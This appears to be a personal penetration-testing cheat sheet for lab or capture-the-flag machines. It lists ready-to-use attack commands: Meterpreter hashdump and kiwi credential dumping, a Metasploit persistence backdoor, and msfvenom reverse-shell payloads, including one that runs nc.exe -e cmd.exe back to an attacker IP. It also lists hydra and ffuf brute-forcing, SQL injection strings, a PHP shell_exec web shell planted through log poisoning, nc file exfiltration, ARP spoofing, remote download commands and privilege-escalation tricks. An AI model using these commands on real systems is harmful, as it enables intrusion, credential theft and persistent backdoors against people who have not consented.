Enumeration 
	
	1. Basic Port and Service Scan
	>nmap -sS -p- -T4 -vv IP 
	>nmap -sS -p[port List] -T4 -A -vv IP -oN nmap.output


	2. Combined nmap scan
		>nmap -sn [IP] -oN [file]
		>cat [file] | grep for | grep -v [own ip to remove] | cut -d " " -f 5 > ips.txt
		>nmap -sV -sC -n -vv -Pn -p- -T4 -A -iL ips.txt --open
			-n: to disable reverse DNS lookup
			--open: to only see open ports.


	2. script search
	>grep [query_string] /usr/share/nmap/scripts/script.db

	3. SMB enum
	>nmap --script=smb-enum-shares -p445 -vv IP -oN smb_enum_shares.output
	>nmap --script=smb-enum-users -p445 -vv IP -oN smb_enum_users.output

	4. Search for any random directory and identify the service version for web server.


Exploitation
	Meterpreter commands:
		1. sysinfo
		2. ps
		3. getuid
		4. getpid
		5. run post/multi/recon/local_exploit_suggester 
		6. migrate [PID]
		7. run persistence -X
		8. hashdump
		9. search -f [filenname]
		10.load kiwi
				>creds_all
				>lsa_dump_sam



Remote Access
	>xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:PATH_TO_DRIVE,DRIVE_NAME_TO_MOUNT

Basic Linux Commands:
  Find Command:
	1. To find suids: find / -perm -u=s -type f 2>/dev/null
	2. find files based on filename: find [dir] -type f -name [name]
	3. find dir based on dir name: find [dir] -type d -name [dir name]
	4. Find files based on size: find [dir] -type f -size [size]
	5. find files based on owner: find [dir] -type f -user [username]
	6. find files based on group: find [dir] -type f -group [groupname]
	7. find files based on date modified: find [dir] -type f -newermt [startDate range] ! -newermt [endDate range]
	find / -type d -writable
	8. -o: or
	9. -a: and
	10. -exec [command] {} \; 2>/dev/null
 
  grep command
  	1. find keyword in all the files: grep -iRl [dirpath/keyword]
  	2. grep -E [Extended regex] file
  
  less command
  	1. less filename
  	/[keyword_to_search]	
  
  sha1sum [file]	
  
  mv command
  	1. mv [file1] [file2] [file3] -t [dir to move to] - moves all three files simultaneously
  
  scp command
  	1. Upload file to a remote machine
  		>scp [filename] username@IP:/[dir]
  
  filenames starting with -
  	[command] -- -[filename] 
  
  base64 decode
  	cat filename | base64 -d
  	
  gpg
    Encryption:
  	>gpg --cipher-algo [cipher] --symmetric [filename]
  	-> You will be asked a password from which key will be derived.
    Decryption:
    	>gpg [filename]
  
  Mysql
  	>source [sql file] 
  	-> This loads the local sql database in mysql client.
  
  wpscan
  	>wpscan --url [URL] --log 
  	>wpscan --url [URL] -e u (enumerate users)
  	>wpscan --url [URL] -U [user] -P [passfile] (brute force password of user)
  	>wpscan --url [URL] --enumerate ap,at,u --plugins-detection aggressive --plugins-version-detection aggressive
  	-> Using hydra to brute force wp login form:
  		hydra -l c0ldd -P /usr/share/wordlists/rockyou.txt 10.10.181.75 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location" -v

  	404.php location: localhost/wp-content/themes/twentyseventeen/404.php
   


  steghide 
  	>steghide --info [photo]
  	>steghide extract -sf [photo]
  
  
  binwalk
	>binwalk -e [file] -extract useful info from binary

  hydra
  	>hydra -l [username] -P [passfile] IP http-get "/dir:A=BASIC/NTLM/MD5:F=failed_string" -v 
  	>hydra -l [username] -P [passfile] IP http-post-form "/dir:username=^USER^&password=^PASS^:failed_string" -v
  
  nikto 
  	>nikto -host [hostname/url] -id [user:pass]
  
  File transfer using nc:
  	nc -l -p [port] > file (on attacker machine)
  	nc -w 5 [attacker IP] [port] < file

  OS info
  	cat /etc/os-release
  	cat /etc/lsb-release
  	uname -a

  Print sequence of numbers:
  >seq x y 
  	- x -starting number
  	- y -ending number

  DNS 
  >nslookup
  	>server [IP]
  	>[IP]
  >dig
  	>dig axfr @[IP] [zone/domain] - to copy zone information

  sqlmap
  	>sqlmap -r [request page]
  	>sqlmap -u [url] --users
  	>sqlmap -u [url] --dump -D [database] -T [table]
  	



  TTY shell
  >python3 -c 'import pty;pty.spawn("/bin/bash")'
  	or python
  ^Z
  >stty raw -echo
  >fg
  >export TERM=xterm

  To gain ssh access if the target doesnt have id_rsa present.
  	-> generate your own id_rsa key on your system
  	-> include an associated key into authorized_keys file on the target machine.

  	-> Execute ssh-keygen and you should see id_rsa and id_rsa.pub files appear in your o
			own .ssh folder.
		-> Copy the content of the id_rsa.pub file and put it inside the authorized_keys    file on the target(located in .ssh).
		-> After that use your generated id_rsa file to login to the machine.

Routing
	>route - print routing information
	>ip route add Network/subnetMask via gateway


Windows cmd
	cd - change directory
	dir /s /b passwords.txt - to search file named passwords.txt

Mysql
	>mysql -u username -pPASSWORD -h [host] [DBMS (optional)] -P [port]
	>update [table] set [col2]=value2 where col1=value1;


Sqli
	sqlmap -u http://10.124.211.96/newsdetails.php?id=1 -D awd -T accounts --dump
	php?id=26 and 1=1; -- -
	php?id=26 and 1=2; -- -
	' or 1=1; -- -
	sqlmap -r [request file]
	--batch : this option will tell sqlmap to dont ask any questions and stick to defaults.
	--dbs - list databases 
	-D [database]
	--tables - list tables
	-T [table]
	--columns -list columns
	-C [column] 
	--dump
	--forms
	--risk=3
	--level=5
	--threads=4

Enum4linux 
	>enum4linux -n [IP]
		-> If the output in nbtstat info shows <20> for any service, then it can be exploited.
	>enum4linux -a [IP]

Smbclient
	>smbclient //[IP]/[share]
		-N: no password
		-I: IP
		-L: list shares
		-U: username

MITM/ARP po
	>echo 1 > /proc/sys/net/ipv4/ip_forward - forward packets
	>arpspoof -i [interface] -t [target] -r [host]

Persistence module in MSF (backdoor)
	>use exploit/windows/local/persistence
		->set reg_name backdoor
		->set exe_name backdoor
		->set startup SYSTEM
		->set session [number]
		->set payload windows/meterpreter/reverse_tcp
		->set exitfunc process
		->set lhost []
		->set lport []
		->set DisablePayloadHandler false


msfvenom
	Creating meterpreter based linux executable
		>msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=IP lport=[p] -f elf -o meter
	Creating meterpreter based windows payload
		>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.2.175 LPORT=5555 -f exe -o shell.exe
	Abusing unquoted service path
	 	>msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe	


dirb
	>dirb [address] -u [username:pass] -> if logged in

Msfconsole
	For mssql:
		>use auxiliary/scanner/mssql/mssql_login - to check if identified credentials are valid or not.
		>use auxiliary/admin/mssql/mssql_enum - automate enumuration against sql server.
		>use exploit/windows/mssql/mssql_payload - if your user belongs to admin group, this can compromise the whole server.
		>use auxiliary/scanner/ssh/ssh_login - to guess valid ssh credentials.

Crawler/spider
	> use OWASP ZAP for the same.

php injection
	>system("linux command");

LFI (If present)
	?parameter=php://filter/convert.base64-encode/resource=file
	Now getting rev shell
	Set burp proxy - 
	Check if you can access /var/log/apache2/access.log
	IF yes then in the get request to the log file replace user agent field to
		<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
		Its called log poisoning
		
Sudo 
	sudo -u [user] command - to run command as another user.

PAth manipulation
	echo "bash -p" > [binary]
	-> Then add the current path to the PAth variable.
	Now binary will execute the binary from the current directory.
	Note: If the command doesnt have absolute path present in the code of binary.

If ports 111 and 2049 open (NFS)
	> rpcinfo -p <IP>
	> showmount -e [remote IP]
	> mkdir /tmp/mountme
	> mount -t nfs [IP]:/dir /tmp/mountme

Redis server
	> redis-cli -h [IP] -p [port] -a [passwd]
	> KEYS * - list all keys
	> get [key] - if it contains only one value
	> lrange [key] 0 -1 - output all elements of a key of type list.

Rsync
	>rsync rsync://host@IP/dir - to view files in dir
	>rsync -v rsync://host@IP:/dir/file - to copy file
	>rsync -a [file to copy] rsync://host@IP:/[loc to copy to] - to upload to server.
	

Google Dorking
	1. Include your query between quotation marks. It will search for that exact string.
	2. site: bbc.co.uk "search string"
	3. filetype: pdf
	4. cache: view google's cached version of the url.
	5. intitle: phrase must appear in the title of the page.		


Windows file upload
	>certutil -urlcache -f <uri> <outfile>
	>powershell Invoke-WebRequest -Uri <uri> -Outfile <outfile>
	>powershell "(New-Object System.Net.WebClient).Downloadfile('http://ip:port/file.exe','file.exe')"

	
Dirsearch 
	>dirsearch -u [url] -e [extensions] -w [wordlist] -t 200 


Library tracer
	> ltrace [binary] - runs the given command until it exits and inspects all the library calls

wfuzz
	>wfuzz -X [Method] -w [wordlist] -u http://IP/items=FUZZ


echo
	> echo $(pwd) -> pwd command will get executed.
	-> Any command supplied between $() will get executed.
	-> This can be leveraged to gain root shell if the binary is allowed to run as root and the binary contains echo command where we are able to input.


Port knocking
	> knock IP Port1 Port2 Port3 ....
	
FTP
	>site cpfr [source path from file]
	>site cpto [destination path for file]
	>mget * - transfer all files from a directory.
	>binary - switch mode to binary.

	
ffuf
	-u [target URL]
	-w [wordlist]
	-X [HTTP method to use] : GET request by default
	-H [Header "Name: Value"]
	-d [POST DATA]
	Matching options
	-mc 200,301,... match status codes
	-mr [Match regexp]
	-fc 200 : filter code

	-> Using ffuf to brute force
		>ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200

		w1: wordlist 1
		w2: wordlist 2
		-> Here w1 and w2 are the FUZZ keywords we are using.

	-> Using ffuf to brute force directories
		ffuf -w [wordlist_file]:FUZZ -u [url]/FUZZ

fcrackzip
	-v: verbose
	-u: unzip
	-D: Dictionary attack
	-p: file

	>fcrackzip -v -u -D [wordlist] -p [zip file]
	
Dnsrecon
	-> dnsrecon -r 127.0.0.0/24 -n [target IP] -d [domain]
		-> Even if we dont know the domain, it will still find it.
		-> So you can put domain as blah

gpg
	-> If you have two files with .asc and .pgp as extensions then
	-> First create a hash of .asc key using gpg2john and then crack the hash using john.
	-> Then import the key using: gpg --import file.asc
	-> It will ask for passphrase.
	-> The key will be imported.
	-> Now decrypt .pgp file using: gpg --decrypt file.gpg and again enter the passphrase obtained.

See all capabilities:
	>getcap -r / 2>/dev/null
	

Openssl
	>openssl passwd -6 -salt rishabh password
		-> passwd - command to create a hashed password
		-> -6 : SHA512 based algorithm
		-> -salt [val] - use provided salt
		-> password : provided value for hashing.

	
Wfuzz (For subdomain enumeration)
	>wfuzz -c -f [output_file] -w [wordlist from seclists DNS subdomains] --sc 200,202,204,301,302,307,403 
		-u <target url> -H "Host: FUZZ.chaos.htb" --hw 290
			-c: output in color
			-f: output file
			--sc: match status codes.
			--hw: hide responses with specified words.
			-H: important for subdomains.

sqsh (for mssql)
	sqsh -S <IP> -U <Username> -P <Password> -D <Database>
	>SELECT * FROM table_name WHERE CONDITION;
	>go
	>xp_cmdshell 'COMMAND'; - to run system commands



Download SMB share:
	smbget -R smb://<IP>/anonymous

Command Execution
	`any command` 
	-> Any command inside backticks takes precedence over everything. So command insode those will get executed first
	-> If spaces are not allowed after command then use ;cat{IFS}file.txt;


To list all the files with lines count in descending order. Can be helpful if you want to decide which password file to use.
> find . -type f -exec wc -l {} \; | sort -nr


r2 [binary]
give any input
>afl - to analyze functions call
>vvv - visualization mode


Abusing ??
If you cd to /r??t, It will go to root directory because there is nothing else in that format. 

strings 
	-atx 
		-> a flag is for scan in an entire file
		-> t flag is for print location of string
		-> x flag is for print location of string in hex.

cd - 
	-> to go to previous working directory.
	
Cewl - Web crawler to create a customised dictionary that can be used for brute force. 
	>cewl <url> -w [outfile]
	

Creating a dictionary using hashcat:
	>hashcat -r /usr/share/hashcat/rules/best64.rule --stdout file > dict.txt
	-> Here file contains the word "PleaseSubscribe!" and this command will create all variations from this work and dump to dict.txt


mysqldump
	-h localhost
	-p password
	-u username
	-B magic

Mysql
	Creating a user with host and password and granting priviliges 
	> grant all privileges on DATABASE TO USER@HOST identified by [password];
	> flush privileges;
	> create user 'ippsec'@'REMOTE IP' IDENTIFIED BY 'PASSWORD';
	> GRANT ALL on [DATABASE].* TO 'USER'@'REMOTE IP';
	> FLUSH PRIVILEGES;


awk
	cat nmap | frep open | awk -F/ '{print $1}' ORS=','; echo

socat
	>socat TCP-LISTEN:3306,fork,bind=[LOCAL IP] TCP:127.0.0.1:3306

MYsql server config file: /etc/mysql/mariadb.conf.d/50-server.cnf

grep
	>grep -R 127.0.0.1 . -> Search recursively on this directory for the specified string. 

SETENV
	if the user has sudo privileges to run any command, and the format is like this
		(ALL) SETENV: [COMMAND]
			-> Then the user can set environment variables and run the command.

Find binaries or files which are manually edited by a user:
>for i in /usr/sbin /usr/bin /sbin /bin /snap/bin;do ls -la --time-style=full $i | grep -v '00000\|->';done

>echo $PATH | sed 's/:/ /g'
- replaces : with a space

John with dynamic format
john --format=dynamic='sha512($p.$s)' --wordlist=/usr/share/wordlists/rockyou.txt backdoor_hash

winexe - linux based application which allows us to execute commands in windows based system
	>winexe -U Administrator%[Password] //IP "cmd.exe"

Windows shells:
	1. psexec.py username:'password'@IP
	2. smbexec.py username:'password'@IP
	3. wmiexec.py username:'password'@IP
	4. mssqlclient.py DOMAINName\user:'password'@IP -windows-auth

Remote desktop
>rdesktop IP -g 95%

Pyftpdlib
	>python3 -m pyftpdlib -p [port number] --write
	-> Now from the victim machine, you can write files or download files from this ftp server.
	

Mounting samba share if anonymous access is allowed:
>cd mnt
>mkdir backups
>mount -t cifs -o 'rx,username=guest' //IP/Backups backups
	-> Backups is the share name, anonymous access is allowed so we are providing the username as guest.

Dumping NTLM hashes using secretsdump.py from impacket
>secretsdump.py -sam [sam file] -security [security file] -system [system file] LOCAL
	
Responder:
	responder -I tun0 -w -F --lm -v

smbmap
	-H: host
	-u: user
	-p: pass
	
TFTP pentesting
>use auxiliary/admin/tftp/tftp_transfer_util
	-> set local file to upload
	-> If lfi present, then call the file from tftp's directory.
		-> conf file: /etc/default/tftpd-hpa
		-> default folder: /var/lib/tftpboot/


asp file bypass extensions:
.asp 
.aspx
.config
.ashx
.asmx 
.aspq
.axd
.cshtm
.cshtml
.rem
.soap
.vbhtm
.vbhtml
.asa
.cer
.shtml

msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.16.20 7777' -b '\x00\x0A\x0D' -f py -v payload

SVN
	svn ls svn://$IP - list files
	svn log svn://$IP - commit history
	svn checkout svn://$IP - download everything or pull.

rustscan -a $IP -r 1-65535 --scan-order "Random" -- -A -sC -vv -sV -Pn -oN nmap_full_scan

Crackmapexec:
	crackmapexec smb 10.0.2.0/24 -u fcastle -p Password1 -d MARVEL.local
		--sam : dumping sam if we have access to any of the machines.

smbclient:
	>prompt off
	>recurse on
		-> If we do ls now, it will list all the files in the share.
	>mget *
		-> it will download all the files.

Smb server:
	>smbserver.py share `pwd`
	